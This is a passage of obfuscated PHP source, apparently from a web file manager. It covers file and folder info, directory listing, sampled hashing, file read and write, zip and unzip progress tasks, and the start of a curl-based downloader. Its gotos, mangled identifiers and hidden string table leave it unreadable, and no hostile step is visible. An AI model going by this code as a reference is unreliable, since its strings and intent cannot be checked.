folderInfo($fÂàÀó†Ò , $aÖÄôùŞÈà = false, $BÄôç£±Ò = false) { goto BãĞ±¬ï–›; BãĞ±¬ï–›: $E¢ç³ÒŸê =& $_SERVER[İåâé¾]; $fÂàÀó†Ò  = rtrim($fÂàÀó†Ò , $E¢ç³ÒŸê[8]) . $E¢ç³ÒŸê[8]; $C‡„Œåš»Ğ = $this->iconvApp($this->pathThis($fÂàÀó†Ò )); goto BÃ±–ƒù¿Š; a»œÛßÔÔ¨: return $b¦ë»†‰¸İ; goto fÍ†é­º†§; BÃ±–ƒù¿Š: if ($BÄôç£±Ò) { return array($E¢ç³ÒŸê[28] => $C‡„Œåš»Ğ, $E¢ç³ÒŸê[76] => $this->getPathOuter($fÂàÀó†Ò ), $E¢ç³ÒŸê[29] => $E¢ç³ÒŸê[77]); } $b¦ë»†‰¸İ = array($E¢ç³ÒŸê[28] => $C‡„Œåš»Ğ, $E¢ç³ÒŸê[76] => $this->getPathOuter($fÂàÀó†Ò ), $E¢ç³ÒŸê[29] => $E¢ç³ÒŸê[77], $E¢ç³ÒŸê[186] => @filectime($fÂàÀó†Ò ), $E¢ç³ÒŸê[105] => @filemtime($fÂàÀó†Ò ), $E¢ç³ÒŸê[190] => 1, $E¢ç³ÒŸê[191] => 1, $E¢ç³ÒŸê[892] => is_readable($fÂàÀó†Ò ), $E¢ç³ÒŸê[893] => is_writable($fÂàÀó†Ò ), $E¢ç³ÒŸê[897] => get_mode($fÂàÀó†Ò )); if ($aÖÄôùŞÈà) { $b¦ë»†‰¸İ[$E¢ç³ÒŸê[190]] = $this->has($fÂàÀó†Ò , !1); $b¦ë»†‰¸İ[$E¢ç³ÒŸê[191]] = $this->has($fÂàÀó†Ò , !0); } goto a»œÛßÔÔ¨; fÍ†é­º†§: } private function fileInfo($Aö‰À‹¹, $dé—ª™×¸â = false) { $FÕ¹˜¦Ï…— =& $_SERVER[İåâé¾]; $FÅŠÍ±‚ = $this->iconvApp($this->pathThis($Aö‰À‹¹)); if ($dé—ª™×¸â) { return array($FÕ¹˜¦Ï…—[28] => $FÅŠÍ±‚, $FÕ¹˜¦Ï…—[76] => $this->getPathOuter($Aö‰À‹¹), $FÕ¹˜¦Ï…—[29] => $FÕ¹˜¦Ï…—[163], $FÕ¹˜¦Ï…—[78] => $this->size($Aö‰À‹¹), $FÕ¹˜¦Ï…—[156] => $this->ext($FÅŠÍ±‚)); } $D…¥ğ¤ƒ‡ = array($FÕ¹˜¦Ï…—[28] => $FÅŠÍ±‚, $FÕ¹˜¦Ï…—[76] => $this->getPathOuter($Aö‰À‹¹), $FÕ¹˜¦Ï…—[29] => $FÕ¹˜¦Ï…—[163], $FÕ¹˜¦Ï…—[186] => @filectime($Aö‰À‹¹), $FÕ¹˜¦Ï…—[105] => @filemtime($Aö‰À‹¹), $FÕ¹˜¦Ï…—[78] => $this->size($Aö‰À‹¹), $FÕ¹˜¦Ï…—[156] => $this->ext($FÅŠÍ±‚), $FÕ¹˜¦Ï…—[892] => is_readable($Aö‰À‹¹), $FÕ¹˜¦Ï…—[893] => is_writable($Aö‰À‹¹), $FÕ¹˜¦Ï…—[897] => get_mode($Aö‰À‹¹)); $this->fileInfoImage($Aö‰À‹¹, $D…¥ğ¤ƒ‡); return $D…¥ğ¤ƒ‡; } public function exist($eóÅ§ŞÒÎå) { $eóÅ§ŞÒÎå = $this->iconvSystem($eóÅ§ŞÒÎå); return @file_exists($eóÅ§ŞÒÎå); } public function _isFile($Cí”ãšê¸ƒ) { $Cí”ãšê¸ƒ = $this->iconvSystem($Cí”ãšê¸ƒ); return @is_file($Cí”ãšê¸ƒ); } public function _isFolder($bÑ¯§Ôëµ„) { $bÑ¯§Ôëµ„ = $this->iconvSystem($bÑ¯§Ôëµ„); return @is_dir($bÑ¯§Ôëµ„); } public function size($a§Ê¾¾†ë˜) { return $this->cacheMehod($_SERVER[İåâé¾][894], $a§Ê¾¾†ë˜); } public function info($a”ñÃ™éàÜ) { return $this->cacheMehod($_SERVER[İåâé¾][182], $a”ñÃ™éàÜ); } public function isFile($B´ö¸‚¾Ùõ) { return $this->cacheMehod($_SERVER[İåâé¾][183], $B´ö¸‚¾Ùõ); } public function isFolder($eç‹ùÌìØ) { return $this->cacheMehod($_SERVER[İåâé¾][184], $eç‹ùÌìØ); } private function fileInfoImage($dï÷à‰½Ğ, &$FµŒ¬§™ñ) { $Aø§´Ê•¹† =& $_SERVER[İåâé¾]; $Cò„«¹³ºµ = array($Aø§´Ê•¹†[207], $Aø§´Ê•¹†[157], $Aø§´Ê•¹†[208], $Aø§´Ê•¹†[209], $Aø§´Ê•¹†[210]); if (in_array($FµŒ¬§™ñ[$Aø§´Ê•¹†[156]], $Cò„«¹³ºµ)) { $f¤œîç»‚ = GetImageSize($dï÷à‰½Ğ); if ($f¤œîç»‚) { $FµŒ¬§™ñ[$Aø§´Ê•¹†[211]] = array($Aø§´Ê•¹†[212] => $f¤œîç»‚[0], $Aø§´Ê•¹†[898] => $f¤œîç»‚[1]); } } } public function listPath($Cœ¿­ëßá, $C¿—Ë…–£œ = true, $F¾·¸³ = false) { goto Cµ…¦†‰‹µ; B²ÓÖ™¼±ø: closedir($DÔà—†Œƒ); return $E±Ûá–®Ë—; goto cÛ¬¬­óÄ; BøÃè³‰š: $E±Ûá–®Ë— = array($A¥´‹ÕÆ‡Œ[75] => array(), $A¥´‹ÕÆ‡Œ[74] => array()); if (!($DÔà—†Œƒ = @opendir($Cœ¿­ëßá))) { return $E±Ûá–®Ë—; } while (($fë È¯ÛÎî = readdir($DÔà—†Œƒ)) !== !1) { if ($fë È¯ÛÎî == $A¥´‹ÕÆ‡Œ[90] || $fë È¯ÛÎî == $A¥´‹ÕÆ‡Œ[895]) { continue; } $Fİ³’Ô‡¦ª = $Cœ¿­ëßá . $fë È¯ÛÎî; if (is_file($Fİ³’Ô‡¦ª)) { $E±Ûá–®Ë—[$A¥´‹ÕÆ‡Œ[74]][] = $this->fileInfo($Fİ³’Ô‡¦ª, $F¾·¸³); } else { $E±Ûá–®Ë—[$A¥´‹ÕÆ‡Œ[75]][] = $this->folderInfo($Fİ³’Ô‡¦ª, $C¿—Ë…–£œ, $F¾·¸³); } } goto B²ÓÖ™¼±ø; Cµ…¦†‰‹µ: $A¥´‹ÕÆ‡Œ =& $_SERVER[İåâé¾]; $Cœ¿­ëßá = $this->iconvSystem($Cœ¿­ëßá); $Cœ¿­ëßá = rtrim($Cœ¿­ëßá, $A¥´‹ÕÆ‡Œ[8]) . $A¥´‹ÕÆ‡Œ[8]; goto BøÃè³‰š; cÛ¬¬­óÄ: } public function listAll($b£¥‡Å·ÕÕ, &$EÌÜÆİ‘¼ = array()) { goto a–ã°Œ†Õ’; C¬’¶¹•„ó: if (!($EÊ˜áæÄ© = @opendir($b£¥‡Å·ÕÕ))) { return $EÌÜÆİ‘¼; } while (($AÚÁ ¡ƒø = readdir($EÊ˜áæÄ©)) !== !1) { if ($AÚÁ ¡ƒø == $CŠ´õá—Äõ[90] || $AÚÁ ¡ƒø == $CŠ´õá—Äõ[895]) { continue; } $FÏ¡‚‘‘’ = $b£¥‡Å·ÕÕ . $AÚÁ ¡ƒø; if (is_dir($FÏ¡‚‘‘’)) { $EÌÜÆİ‘¼[] = array($CŠ´õá—Äõ[76] => $FÏ¡‚‘‘’ . $CŠ´õá—Äõ[8], $CŠ´õá—Äõ[77] => 1, $CŠ´õá—Äõ[78] => 0); $this->listAll($FÏ¡‚‘‘’, $EÌÜÆİ‘¼); } else { $EÌÜÆİ‘¼[] = array($CŠ´õá—Äõ[76] => $FÏ¡‚‘‘’, $CŠ´õá—Äõ[77] => 0, $CŠ´õá—Äõ[78] => $this->size($FÏ¡‚‘‘’)); } } closedir($EÊ˜áæÄ©); goto Cêá¯«›ß; Cêá¯«›ß: return $EÌÜÆİ‘¼; goto C–ÌÖ‹çœã; a–ã°Œ†Õ’: $CŠ´õá—Äõ =& $_SERVER[İåâé¾]; $b£¥‡Å·ÕÕ = $this->iconvSystem($b£¥‡Å·ÕÕ); $b£¥‡Å·ÕÕ = rtrim($b£¥‡Å·ÕÕ, $CŠ´õá—Äõ[8]) . $CŠ´õá—Äõ[8]; goto C¬’¶¹•„ó; C–ÌÖ‹çœã: } public function has($C»‰ã„óœ, $CÔÍÖò·˜© = true) { goto eãÔòæåÖè; b÷³¬¹ìµŞ: return !1; goto C…®éˆ…Å¤; eãÔòæåÖè: $C¸È„´‹ğ® =& $_SERVER[İåâé¾]; $C»‰ã„óœ = $this->iconvSystem($C»‰ã„óœ); $C»‰ã„óœ = rtrim($C»‰ã„óœ, $C¸È„´‹ğ®[8]) . $C¸È„´‹ğ®[8]; goto F±“ğ¹ÔóÏ; F±“ğ¹ÔóÏ: if (!($b Õª²£… = @opendir($C»‰ã„óœ))) { return !1; } while (($Cø¨š©ë• = readdir($b Õª²£…)) !== !1) { if ($Cø¨š©ë• == $C¸È„´‹ğ®[90] || $Cø¨š©ë• == $C¸È„´‹ğ®[895]) { continue; } $cËÂò³¨Õ = $C»‰ã„óœ . $Cø¨š©ë•; if ($CÔÍÖò·˜©) { if (@is_file($cËÂò³¨Õ)) { return !0; } } else { if (@is_dir($cËÂò³¨Õ . $C¸È„´‹ğ®[8])) { return !0; } } } closedir($b Õª²£…); goto b÷³¬¹ìµŞ; C…®éˆ…Å¤: } public function hashSimple($A¢î‚âãÌ) { goto B“øçé§Œ‰; Aù“Ô´ˆ„§: if ($føÎŞ—×·ê <= $CÍÅ’ šƒ¢ * $dñå·„») { return $this->hashMd5($A¢î‚âãÌ) . $føÎŞ—×·ê; } $BÆ£ù ›è¸ = $f¹Ã¬ÜÃª†[33]; $eòñ‚ÙŸé² = intval($føÎŞ—×·ê / $dñå·„»); goto BŠñ‹ÂÛ; A‰¬—òŸè: return md5($BÆ£ù ›è¸) . $føÎŞ—×·ê; goto eîå‡àŸ¶‘; B“øçé§Œ‰: $f¹Ã¬ÜÃª† =& $_SERVER[İåâé¾]; if (!$A¢î‚âãÌ) { return md5($f¹Ã¬ÜÃª†[33]); } $A¢î‚âãÌ = $this->iconvSystem($A¢î‚âãÌ); goto C›¬ãÃÛ“§; C›¬ãÃÛ“§: $føÎŞ—×·ê = $this->size($A¢î‚âãÌ); $CÍÅ’ šƒ¢ = 200; $dñå·„» = 50; goto Aù“Ô´ˆ„§; f§ÃŸèŒ´: fseek($f¡Œå§À¢Í, $føÎŞ—×·ê - $CÍÅ’ šƒ¢); $BÆ£ù ›è¸ .= fread($f¡Œå§À¢Í, $CÍÅ’ šƒ¢); fclose($f¡Œå§À¢Í); goto A‰¬—òŸè; BŠñ‹ÂÛ: $f¡Œå§À¢Í = fopen($A¢î‚âãÌ, $f¹Ã¬ÜÃª†[899]); if (!$f¡Œå§À¢Í) { return $BÆ£ù ›è¸; } for ($A’È®å‘”· = 0; $A’È®å‘”· < $dñå·„»; $A’È®å‘”·++) { fseek($f¡Œå§À¢Í, $eòñ‚ÙŸé² * $A’È®å‘”·); $BÆ£ù ›è¸ .= fread($f¡Œå§À¢Í, $CÍÅ’ šƒ¢); } goto f§ÃŸèŒ´; eîå‡àŸ¶‘: } public function getContent($BñÑ¶ÀŠˆ) { $BñÑ¶ÀŠˆ = $this->iconvSystem($BñÑ¶ÀŠˆ); return file_get_contents($BñÑ¶ÀŠˆ); } public function setContent($BÚÚ–˜ãÛË, $aÑ«ÕÁã¯ = '') { $BÚÚ–˜ãÛË = $this->iconvSystem($BÚÚ–˜ãÛË); return file_put_contents($BÚÚ–˜ãÛË, $aÑ«ÕÁã¯, LOCK_EX); } public function fileSubstr($CİŞæˆ£°±, $Fâ¨ßë¾ó§ = 0, $b›»ƒéôÕ = false) { goto bÉ—Óğ‰„; bÉ—Óğ‰„: $EèØì÷ö²Å =& $_SERVER[İåâé¾]; $CİŞæˆ£°± = $this->iconvSystem($CİŞæˆ£°±); if ($b›»ƒéôÕ === !1) { $b›»ƒéôÕ = $this->size($CİŞæˆ£°±); } goto fáö‚ñ±ª; fáö‚ñ±ª: if ($b›»ƒéôÕ <= 0) { return $EèØì÷ö²Å[33]; } $E‰Ù«ŒÍÇÒ = fopen($CİŞæˆ£°±, $EèØì÷ö²Å[899]); if (!$E‰Ù«ŒÍÇÒ) { return !1; } goto fÑñ†…èÄ; fÑñ†…èÄ: fseek($E‰Ù«ŒÍÇÒ, $Fâ¨ßë¾ó§); $c³šïÊò¿ã = fread($E‰Ù«ŒÍÇÒ, $b›»ƒéôÕ); fclose($E‰Ù«ŒÍÇÒ); goto fŞã™ò®Ï„; fŞã™ò®Ï„: return $c³šïÊò¿ã; goto e”¹ïƒ‰Ô; e”¹ïƒ‰Ô: } public function upload($BæÀİæïïŸ, $d¦»§ç…‚×, $A­£Æâ¤· = false, $C¶†˜ˆÁàÒ = REPEAT_REPLACE) { $C›‘ë±“„µ = $this->copyFile($d¦»§ç…‚×, $BæÀİæïïŸ); return $C›‘ë±“„µ ? $this->getPathOuter($BæÀİæïïŸ) : !1; } public function download($aù‰ÕÛá–Ü, $FÂµ”‘ğÊÛ) { return $this->iconvSystem($aù‰ÕÛá–Ü); } } goto AÈ¢òÉ´²â; B¿œ‰”½‰: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto b§º‰–É­; b§º‰–É­: $BÏîç™®…÷ =& $_SERVER[İåâé¾]; parent::startAfter(); Hook::bind($BÏîç™®…÷[1143], array($this, $BÏîç™®…÷[1144])); goto eªí¢øèÕº; eªí¢øèÕº: Hook::bind($BÏîç™®…÷[783], array($this, $BÏîç™®…÷[1145])); $bù°ÚèÙ =& $this->task; $bù°ÚèÙ[$BÏîç™®…÷[1146]] = $BÏîç™®…÷[788]; goto a¾ÒË½‘ğ‘; a¾ÒË½‘ğ‘: if (!$bù°ÚèÙ[$BÏîç™®…÷[996]]) { $bù°ÚèÙ[$BÏîç™®…÷[996]] = LNG($BÏîç™®…÷[1147]); } goto CÄÍ¸ ˜ ; CÄÍ¸ ˜ : } protected function endAfter() { $F‹‰öíƒõµ =& $_SERVER[İåâé¾]; parent::endAfter(); Hook::unbind($F‹‰öíƒõµ[1143], array($this, $F‹‰öíƒõµ[1144])); Hook::unbind($F‹‰öíƒõµ[783], array($this, $F‹‰öíƒõµ[1145])); } public function updateAfter() { $b½Áª‚—âº =& $_SERVER[İåâé¾]; $aŒßê©¬Û =& $this->task; if (!$aŒßê©¬Û[$b½Áª‚—âº[1088]] || !$aŒßê©¬Û[$b½Áª‚—âº[455]]) { return; } if ($aŒßê©¬Û[$b½Áª‚—âº[1146]] == $b½Áª‚—âº[788]) { $DºÍ¯×ƒÒ = 0; if ($aŒßê©¬Û[$b½Áª‚—âº[1126]]) { $DºÍ¯×ƒÒ = $aŒßê©¬Û[$b½Áª‚—âº[1127]] / $aŒßê©¬Û[$b½Áª‚—âº[1126]]; } $aŒßê©¬Û[$b½Áª‚—âº[1090]] = $DºÍ¯×ƒÒ * 0.3; } else { if ($aŒßê©¬Û[$b½Áª‚—âº[1146]] == $b½Áª‚—âº[304]) { $DºÍ¯×ƒÒ = $aŒßê©¬Û[$b½Áª‚—âº[1089]] / $aŒßê©¬Û[$b½Áª‚—âº[1088]]; $aŒßê©¬Û[$b½Áª‚—âº[1090]] = 0.3 + $DºÍ¯×ƒÒ * 0.4; } else { if ($aŒßê©¬Û[$b½Áª‚—âº[1146]] == $b½Áª‚—âº[101]) { $eÀ‹ÎÅ‘Ç„ = 0; if ($aŒßê©¬Û[$b½Áª‚—âº[1128]] == $b½Áª‚—âº[101]) { $eÀ‹ÎÅ‘Ç„ = $aŒßê©¬Û[$b½Áª‚—âº[1127]]; } $DºÍ¯×ƒÒ = ($aŒßê©¬Û[$b½Áª‚—âº[1131]] + $eÀ‹ÎÅ‘Ç„) / $aŒßê©¬Û[$b½Áª‚—âº[455]]; $aŒßê©¬Û[$b½Áª‚—âº[1090]] = 0.3 + 0.4 + $DºÍ¯×ƒÒ * 0.3; } } } if ($aŒßê©¬Û[$b½Áª‚—âº[1090]] > 0) { $D¾æâ‰İ´ = timeFloat() - $aŒßê©¬Û[$b½Áª‚—âº[1092]] - $aŒßê©¬Û[$b½Áª‚—âº[1095]]; $aŒßê©¬Û[$b½Áª‚—âº[1096]] = $D¾æâ‰İ´ * (1 - $aŒßê©¬Û[$b½Áª‚—âº[1090]]) / $aŒßê©¬Û[$b½Áª‚—âº[1090]]; } } public function addFile($e§ƒ‰ÓŸŸ») { goto C×à·‘ÙÑò; D”Ñî±íŠ: $this->update(); goto Bç°ÍÑÁÖ¯; F¬³øÜ˜: $AÅÜ‹ç°[$F‚½áøèóî[1088]] = 1; $AÅÜ‹ç°[$F‚½áøèóî[1132]] = array(); $AÅÜ‹ç°[$F‚½áøèóî[1132]][] = array($F‚½áøèóî[387] => $eÄ‚ïÁ¿Ó [$F‚½áøèóî[28]], $F‚½áøèóî[76] => $eÄ‚ïÁ¿Ó [$F‚½áøèóî[76]], $F‚½áøèóî[773] => $eÄ‚ïÁ¿Ó [$F‚½áøèóî[773]] ? $eÄ‚ïÁ¿Ó [$F‚½áøèóî[773]] : $eÄ‚ïÁ¿Ó [$F‚½áøèóî[76]]); goto D”Ñî±íŠ; C×à·‘ÙÑò: $F‚½áøèóî =& $_SERVER[İåâé¾]; $AÅÜ‹ç° =& $this->task; $eÄ‚ïÁ¿Ó  = IO::info($e§ƒ‰ÓŸŸ»); goto f²°Åğôœˆ; f²°Åğôœˆ: $AÅÜ‹ç°[$F‚½áøèóî[1124]] = $eÄ‚ïÁ¿Ó [$F‚½áøèóî[28]]; $AÅÜ‹ç°[$F‚½áøèóî[1126]] = $eÄ‚ïÁ¿Ó [$F‚½áøèóî[78]]; $AÅÜ‹ç°[$F‚½áøèóî[1127]] = 0; goto bŸ¤À‚•ˆ; bŸ¤À‚•ˆ: $AÅÜ‹ç°[$F‚½áøèóî[1087]] = $F‚½áøèóî[1136]; $AÅÜ‹ç°[$F‚½áøèóî[1128]] = $F‚½áøèóî[788]; $AÅÜ‹ç°[$F‚½áøèóî[455]] = $eÄ‚ïÁ¿Ó [$F‚½áøèóî[78]]; goto F¬³øÜ˜; Bç°ÍÑÁÖ¯: } public function unzipAfter($AµÙ°ã–˜) { goto FöçåëÑë¨; FöçåëÑë¨: $E¸çÎƒØ«æ =& $_SERVER[İåâé¾]; $A¼ÓÎ§œ·† =& $this->task; $A¼ÓÎ§œ·†[$E¸çÎƒØ«æ[1146]] = $E¸çÎƒØ«æ[101]; goto E¤½‹™®Ğ; E¤½‹™®Ğ: $EŠ¨ŒÚ®¤â = IO::infoWithChildren($AµÙ°ã–˜); $A¼ÓÎ§œ·†[$E¸çÎƒØ«æ[1132]] = array(); $A¼ÓÎ§œ·†[$E¸çÎƒØ«æ[1132]][] = array($E¸çÎƒØ«æ[387] => $EŠ¨ŒÚ®¤â[$E¸çÎƒØ«æ[28]], $E¸çÎƒØ«æ[76] => $EŠ¨ŒÚ®¤â[$E¸çÎƒØ«æ[76]], $E¸çÎƒØ«æ[773] => $EŠ¨ŒÚ®¤â[$E¸çÎƒØ«æ[773]] ? $EŠ¨ŒÚ®¤â[$E¸çÎƒØ«æ[773]] : $EŠ¨ŒÚ®¤â[$E¸çÎƒØ«æ[76]]); goto CÀ§ñ„ò’ë; d°‹÷Å¬“: $A¼ÓÎ§œ·†[$E¸çÎƒØ«æ[1124]] = $E¸çÎƒØ«æ[33]; $A¼ÓÎ§œ·†[$E¸çÎƒØ«æ[1131]] = 0; $A¼ÓÎ§œ·†[$E¸çÎƒØ«æ[455]] = $EŠ¨ŒÚ®¤â[$E¸çÎƒØ«æ[78]]; goto DŒç¶áØĞŠ; DŒç¶áØĞŠ: $this->update(); self::log($E¸çÎƒØ«æ[1148] . json_encode(array($A¼ÓÎ§œ·†, $EŠ¨ŒÚ®¤â))); goto EËšŸÂÛòó; CÀ§ñ„ò’ë: if ($EŠ¨ŒÚ®¤â[$E¸çÎƒØ«æ[29]] == $E¸çÎƒØ«æ[163]) { $A¼ÓÎ§œ·†[$E¸çÎƒØ«æ[1088]] = 1; } else { $A¼ÓÎ§œ·†[$E¸çÎƒØ«æ[1088]] = $EŠ¨ŒÚ®¤â[$E¸çÎƒØ«æ[81]][$E¸çÎƒØ«æ[79]]; } $A¼ÓÎ§œ·†[$E¸çÎƒØ«æ[1087]] = $E¸çÎƒØ«æ[33]; $A¼ÓÎ§œ·†[$E¸çÎƒØ«æ[1128]] = 0; goto Cä‡ÀÍ‚˜¡; Cä‡ÀÍ‚˜¡: $A¼ÓÎ§œ·†[$E¸çÎƒØ«æ[1089]] = 0; $A¼ÓÎ§œ·†[$E¸çÎƒØ«æ[1126]] = 0; $A¼ÓÎ§œ·†[$E¸çÎƒØ«æ[1127]] = 0; goto d°‹÷Å¬“; EËšŸÂÛòó: } public function nameParse($B¹™Ä­°ÀÑ) { goto EòİÇ£ØÛÑ; EòİÇ£ØÛÑ: $D„ÙÖ½Ùéé =& $_SERVER[İåâé¾]; $DŠßØ°…ÃÆ =& $this->task; if ($DŠßØ°…ÃÆ[$D„ÙÖ½Ùéé[1146]] == $D„ÙÖ½Ùéé[788]) { $DŠßØ°…ÃÆ[$D„ÙÖ½Ùéé[1146]] = $D„ÙÖ½Ùéé[304]; $DŠßØ°…ÃÆ[$D„ÙÖ½Ùéé[1131]] = 0; $DŠßØ°…ÃÆ[$D„ÙÖ½Ùéé[455]] = 0; } goto bÄæİ¡÷Ù; bÄæİ¡÷Ù: $eÉºÒß¦Â = get_path_this($B¹™Ä­°ÀÑ); if (strstr($eÉºÒß¦Â, $D„ÙÖ½Ùéé[90])) { $DŠßØ°…ÃÆ[$D„ÙÖ½Ùéé[1089]] += 1; $DŠßØ°…ÃÆ[$D„ÙÖ½Ùéé[1088]] += 1; } $DŠßØ°…ÃÆ[$D„ÙÖ½Ùéé[1124]] = $B¹™Ä­°ÀÑ; goto fš¾—øŒ„à; fš¾—øŒ„à: $this->update(); goto aèé°áÛÉ; aèé°áÛÉ: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $c±‚­ê‘ôğ =& $_SERVER[İåâé¾]; parent::startAfter(); Hook::bind($c±‚­ê‘ôğ[1149], array($this, $c±‚­ê‘ôğ[1144])); $B‡É°Ö‘ =& $this->task; $B‡É°Ö‘[$c±‚­ê‘ôğ[1146]] = $c±‚­ê‘ôğ[788]; if (!$B‡É°Ö‘[$c±‚­ê‘ôğ[996]]) { $B‡É°Ö‘[$c±‚­ê‘ôğ[996]] = LNG($c±‚­ê‘ôğ[1150]); } } protected function endAfter() { $D¸åÒéÔ°‹ =& $_SERVER[İåâé¾]; parent::endAfter(); Hook::unbind($D¸åÒéÔ°‹[1149], array($this, $D¸åÒéÔ°‹[1144])); } public function updateAfter() { $BÔÛáàß”¢ =& $_SERVER[İåâé¾]; $D’µ¸Æ£ =& $this->task; if (!$D’µ¸Æ£[$BÔÛáàß”¢[1088]] || !$D’µ¸Æ£[$BÔÛáàß”¢[455]]) { return; } if ($D’µ¸Æ£[$BÔÛáàß”¢[1146]] == $BÔÛáàß”¢[788]) { $e„¼Œ–‘à = $D’µ¸Æ£[$BÔÛáàß”¢[1127]]; if ($D’µ¸Æ£[$BÔÛáàß”¢[1128]] != $BÔÛáàß”¢[788]) { $e„¼Œ–‘à = 0; } $AÙÖ†ÑÏ‡Î = ($D’µ¸Æ£[$BÔÛáàß”¢[1131]] + $e„¼Œ–‘à) / $D’µ¸Æ£[$BÔÛáàß”¢[455]]; $D’µ¸Æ£[$BÔÛáàß”¢[1090]] = $AÙÖ†ÑÏ‡Î * 0.3; } else { if ($D’µ¸Æ£[$BÔÛáàß”¢[1146]] == $BÔÛáàß”¢[304]) { $AÙÖ†ÑÏ‡Î = $D’µ¸Æ£[$BÔÛáàß”¢[1089]] / $D’µ¸Æ£[$BÔÛáàß”¢[1088]]; $D’µ¸Æ£[$BÔÛáàß”¢[1090]] = 0.3 + $AÙÖ†ÑÏ‡Î * 0.5; } else { if ($D’µ¸Æ£[$BÔÛáàß”¢[1146]] == $BÔÛáàß”¢[101]) { $AÙÖ†ÑÏ‡Î = 0; if ($D’µ¸Æ£[$BÔÛáàß”¢[1126]]) { $AÙÖ†ÑÏ‡Î = $D’µ¸Æ£[$BÔÛáàß”¢[1127]] / $D’µ¸Æ£[$BÔÛáàß”¢[1126]]; } $D’µ¸Æ£[$BÔÛáàß”¢[1090]] = 0.3 + 0.5 + $AÙÖ†ÑÏ‡Î * 0.2; } } } if ($D’µ¸Æ£[$BÔÛáàß”¢[1090]] > 0) { $a‰Ì…£Ê®§ = timeFloat() - $D’µ¸Æ£[$BÔÛáàß”¢[1092]] - $D’µ¸Æ£[$BÔÛáàß”¢[1095]]; $D’µ¸Æ£[$BÔÛáàß”¢[1096]] = $a‰Ì…£Ê®§ * (1 - $D’µ¸Æ£[$BÔÛáàß”¢[1090]]) / $D’µ¸Æ£[$BÔÛáàß”¢[1090]]; } } public function copyFileStart($dÙƒ…öîî¥, $D¡ÒÉÊËÂ, $FÊ·ËŒ‰, $A¾ùÛé¤¶”, $aŞ¤›ƒÄ©Ÿ, $B‚—ĞßÒ¶‹) { $E¾Æ®ŞŒ¢ =& $_SERVER[İåâé¾]; parent::copyFileStart($dÙƒ…öîî¥, $D¡ÒÉÊËÂ, $FÊ·ËŒ‰, $A¾ùÛé¤¶”, $aŞ¤›ƒÄ©Ÿ, $B‚—ĞßÒ¶‹); $f»‡”ÄÈ£· =& $this->task; if ($f»‡”ÄÈ£·[$E¾Æ®ŞŒ¢[1146]] == $E¾Æ®ŞŒ¢[304]) { $f»‡”ÄÈ£·[$E¾Æ®ŞŒ¢[1146]] = $E¾Æ®ŞŒ¢[101]; } $this->update(); } public function copyFileEnd($Eƒ°˜ˆ¢˜à, $AÃ¸Œİè‹, $cë¾ÆŞ®, $DÔ«§ñÚ, $f†ÕÀ¡Ôòø, $FÒœöîÇºµ) { $BŒø‰¸Ñ‘Ü =& $_SERVER[İåâé¾]; $B’…ïê†Îó =& $this->task; $B’…ïê†Îó[$BŒø‰¸Ñ‘Ü[1127]] = $B’…ïê†Îó[$BŒø‰¸Ñ‘Ü[1126]]; $B’…ïê†Îó[$BŒø‰¸Ñ‘Ü[1131]] += $B’…ïê†Îó[$BŒø‰¸Ñ‘Ü[1126]]; $B’…ïê†Îó[$BŒø‰¸Ñ‘Ü[1128]] = $BŒø‰¸Ñ‘Ü[33]; $this->update(); } public function nameParse($Eô×Õ­æìÃ) { $B¹ÙŞë¬¸ =& $_SERVER[İåâé¾]; $A•„ÚÉ¸Ó” =& $this->task; if ($A•„ÚÉ¸Ó”[$B¹ÙŞë¬¸[1089]] < $A•„ÚÉ¸Ó”[$B¹ÙŞë¬¸[1088]]) { $aÇ²ä¿©õÍ = get_path_this($Eô×Õ­æìÃ); if (strstr($aÇ²ä¿©õÍ, $B¹ÙŞë¬¸[90])) { $A•„ÚÉ¸Ó”[$B¹ÙŞë¬¸[1089]] += 1; } } if ($A•„ÚÉ¸Ó”[$B¹ÙŞë¬¸[1146]] == $B¹ÙŞë¬¸[788]) { $A•„ÚÉ¸Ó”[$B¹ÙŞë¬¸[1146]] = $B¹ÙŞë¬¸[304]; } $A•„ÚÉ¸Ó”[$B¹ÙŞë¬¸[1124]] = $Eô×Õ­æìÃ; $this->update(); } } class Downloader { static function start($dÉœ‡ôŠ·, $b’ò¢Ÿ‘¯, $E—³„’ùø£ = 10) { goto cÇ„©âœªö; cÚ‹¯Ø¢œÁ: if (is_file($eØØ‹¸…õñ)) { $a’¹ôÇ²™‰ = file_get_contents($eØØ‹¸…õñ); $F¤¦âªñ¨» = json_decode($a’¹ôÇ²™‰, 1); } if (file_exists($b’ò¢Ÿ‘¯) && $b‘ÈÏµ±¯ == filesize($b’ò¢Ÿ‘¯)) { @unlink($aÕ¨¦ŸÄ); @unlink($eØØ‹¸…õñ); return array($eÖ›Œ×óÈ‚[780] => !0, $eÖ›Œ×óÈ‚[782] => $eÖ›Œ×óÈ‚[1155]); } if ($F¤¦âªñ¨»[$eÖ›Œ×óÈ‚[328]] != $b‘ÈÏµ±¯) { $F¤¦âªñ¨» = array($eÖ›Œ×óÈ‚[328] => $b‘ÈÏµ±¯); } goto Dšƒòíøğä; Dšƒòíøğä: if ($FÍˆÅ±ÈŠ > $b‘ÈÏµ±¯) { @unlink($aÕ¨¦ŸÄ); } file_put_contents($eØØ‹¸…õñ, json_encode($F¤¦âªñ¨»)); $fĞõœ‘Áå = self::fileDownloadCurl($dÉœ‡ôŠ·, $b’ò¢Ÿ‘¯, !0, $FÍˆÅ±ÈŠ, $b‘ÈÏµ±¯); goto bÌÉ™¿¹È; F¡˜†¢æîÕ: $b‘ÈÏµ±¯ = intval($bïƒº–Ã°[$eÖ›Œ×óÈ‚[328]]); if (file_exists($aÕ¨¦ŸÄ) && time() - filemtime($aÕ¨¦ŸÄ) < 3) { return array($eÖ›Œ×óÈ‚[780] => !1, $eÖ›Œ×óÈ‚[782] => $eÖ›Œ×óÈ‚[1154]); } $F¤¦âªñ¨» = array(); goto cÚ‹¯Ø¢œÁ; bÌÉ™¿¹È: if ($fĞõœ‘Áå[$eÖ›Œ×óÈ‚[780]]) { @unlink($eØØ‹¸…õñ); } return $fĞõœ‘Áå; goto d¸áÅ„¤§; f–øÉñË˜Œ: $aÕ¨¦ŸÄ = $b’ò¢Ÿ‘¯ . $eÖ›Œ×óÈ‚[1152]; if (is_array($dÉœ‡ôŠ·)) { $bïƒº–Ã° = $dÉœ‡ôŠ·; } else { $bïƒº–Ã° = url_header($dÉœ‡ôŠ·); } $dÉœ‡ôŠ· = $bïƒº–Ã°[$eÖ›Œ×óÈ‚[298]]; goto C«Åéôçù; C«Åéôçù: if 